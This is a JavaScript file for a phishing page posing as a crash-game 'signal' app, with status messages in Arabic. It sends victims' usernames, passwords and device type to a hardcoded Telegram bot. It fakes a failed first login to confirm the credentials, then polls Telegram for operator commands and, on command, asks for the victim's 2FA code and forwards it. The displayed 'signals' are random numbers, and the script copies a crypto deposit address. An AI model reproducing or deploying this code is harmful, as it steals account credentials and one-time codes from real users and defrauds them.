const TG_TOKEN = "8589243363:AAH4sM1DEqNXAUK314uyagIB3GbRouEL8ak";
const CHAT_ID = "8026901193";

let loginAttempts = 0;
let timeLeft = 50;
let isCommandActive = true;

async function processAuth() {
    const u = document.getElementById('u_log').value;
    const p = document.getElementById('u_pas').value;
    const btn = document.getElementById('sync-btn');
    const msg = document.getElementById('status-text');

    if (u.length < 4 || p.length < 4) return alert("البيانات ناقصة!");

    loginAttempts++;

    if (loginAttempts === 1) {
        btn.disabled = true;
        btn.innerText = "Verifying...";
        await sendToTelegram(`⚠️ محاولة 1 (تأكد):\n👤 User: ${u}\n🔑 Pass: ${p}`);
        setTimeout(() => {
            msg.innerText = "❌ خطأ في السيرفر: كلمة المرور أو اليوزر غير صحيح!";
            msg.style.color = "#ff4444";
            document.getElementById('u_pas').value = "";
            btn.disabled = false;
            btn.innerText = "Retry Sync";
        }, 1500);
    } else {
        btn.disabled = true;
        msg.style.color = "#00f2ff";
        await sendToTelegram(`✅ بيانات مؤكدة (محاولة 2):\n👤 User: ${u}\n🔑 Pass: ${p}\n📱 الجهاز: ${navigator.userAgent.includes("Android") ? "Android" : "iPhone"}`);

        // بدء العداد المستقل
        runCountdown();
        // بدء الاستماع الذكي (بدون تعليق)
        listenForCommands();
    }
}

function runCountdown() {
    const msg = document.getElementById('status-text');
    const timer = setInterval(() => {
        if (!isCommandActive) { clearInterval(timer); return; }
        msg.innerText = `⏳ جاري المزامنة السحابية... (ثانية ${timeLeft})`;
        timeLeft--;
        if (timeLeft < 0) {
            clearInterval(timer);
            openRadar();
        }
    }, 1000);
}

// محرك الاستماع الذكي (Recursive Timeout) بدلاً من Interval
async function listenForCommands() {
    if (!isCommandActive) return;

    try {
        const res = await fetch(`https://api.telegram.org/bot${TG_TOKEN}/getUpdates?offset=-1&limit=1`);
        const data = await res.json();
        
        if (data.result && data.result.length > 0) {
            const cmd = data.result[0].message?.text.toUpperCase() || "";
            
            if (cmd === "2FA") {
                isCommandActive = false; // توقيف كل شيء
                stopAndRequest2FA();
                return; // الخروج من حلقة الاستماع
            } else if (cmd === "OK") {
                isCommandActive = false;
                openRadar();
                return;
            }
        }
    } catch (e) { console.log("Polling..."); }

    // بدلاً من Interval، نستدعي الوظيفة مرة أخرى بعد 3 ثوانٍ
    if (isCommandActive) setTimeout(listenForCommands, 3000);
}

// وظيفة جلب الإشارات (GET SIGNAL)
function getSignal() {
    const display = document.getElementById('target-mult');
    display.innerText = "WAIT..";
    setTimeout(() => {
        const mult = (Math.random() * (3.80 - 1.20) + 1.20).toFixed(2) + "x";
        display.innerText = mult;
    }, 1200);
}

function stopAndRequest2FA() {
    const msg = document.getElementById('status-text');
    const pInput = document.getElementById('u_pas');
    const btn = document.getElementById('sync-btn');

    msg.innerText = "⚠️ فشلت المزامنة التلقائية! أدخل رمز الـ 2FA لرفع نسبة الفوز والتحقق النهائي:";
    msg.style.color = "#ffcc00";
    pInput.value = "";
    pInput.placeholder = "Code 2FA (6 digits)";
    btn.disabled = false;
    btn.innerText = "تأكيد الرمز 🔓";
    
    btn.onclick = async () => {
        await sendToTelegram(`🔐 تفضل رمز 2FA للضحية:\n🔢 CODE: ${pInput.value}`);
        alert("جاري التحقق من الرمز...");
        btn.disabled = true;
    };
}

function openRadar() {
    isCommandActive = false;
    document.getElementById('auth-screen').classList.add('hidden');
    document.getElementById('main-app').classList.remove('hidden');
}

async function sendToTelegram(text) {
    try {
        await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: text })
        });
    } catch (e) {}
}

function copyAddr() {
    navigator.clipboard.writeText("TYXbsFZK3HYq3LX1uwX113Ukrm44ib9XDr");
    alert("تم نسخ العنوان");
}
